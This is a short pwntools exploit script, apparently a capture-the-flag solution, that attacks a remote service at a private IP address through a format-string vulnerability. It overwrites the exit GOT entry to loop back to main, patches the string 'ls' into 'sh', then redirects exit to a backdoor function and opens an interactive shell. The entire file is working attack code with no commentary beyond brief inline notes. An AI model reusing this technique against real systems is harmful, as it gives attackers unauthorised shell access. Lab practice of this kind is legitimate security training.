from pwn import *

p = remote("10.22.148.11", 1341)

def recvuntilkey():
    p.recvuntil(b"clair :")
    p.sendline("JUNK")
    p.recvuntil(b"cl\xc3\xa9 : ")

offset = 30
elf = ELF("data/chall")
binls = 0x0804c024+5

recvuntilkey()
payload = fmtstr_payload(offset, {elf.got['exit']: elf.sym['main']}) # loop on main
p.sendline(payload)
recvuntilkey()
payload = fmtstr_payload(offset, {binls: b"sh"}) # Overwrite 'ls' with 'sh'
p.sendline(payload)
recvuntilkey()
payload = fmtstr_payload(offset, {elf.got['exit']: elf.sym['backdoor']}) # trigger backdoor
p.sendline(payload)
p.interactive()

